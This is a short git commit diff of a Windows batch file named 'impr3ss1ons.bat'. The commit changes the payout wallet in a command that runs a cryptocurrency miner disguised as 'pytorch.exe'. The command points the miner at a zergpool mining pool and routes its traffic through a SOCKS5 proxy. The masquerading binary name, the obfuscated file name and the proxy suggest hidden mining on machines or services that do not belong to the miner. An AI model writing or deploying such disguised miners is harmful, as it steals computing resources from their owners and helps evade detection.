a479da966e9ba4aa7c26c7a4638c6771a7f851b8
solinos-utab <51184534+solinos-utab@users.noreply.github.com>
2021-10-01 15:04:25 +0700

    Update impr3ss1ons.bat

--- impr3ss1ons.bat
+++ impr3ss1ons.bat
@@ -1,2 +1,2 @@
-pytorch.exe --disable-gpu --algorithm rx2 --pool rx2.mine.zergpool.com:8335 --wallet D5snbNHPaNYMHAESeTrreRRVx3NLRdGo65 --password c=DGB --keepalive value true;true --cpu-threads 2;2 --cpu-threads-intensity 2 --cpu-threads-priority 2 --proxy socks5://192.252.209.155:14455;socks5://192.252.209.155:14455
+pytorch.exe --disable-gpu --algorithm rx2 --pool rx2.mine.zergpool.com:8335 --wallet DS4o16rvQT8oWEAdTCFT93wAq1pSzEKYHS --password c=DGB --keepalive value true;true --cpu-threads 2;2 --cpu-threads-intensity 2 --cpu-threads-priority 2 --proxy socks5://192.252.209.155:14455;socks5://192.252.209.155:14455
 pause
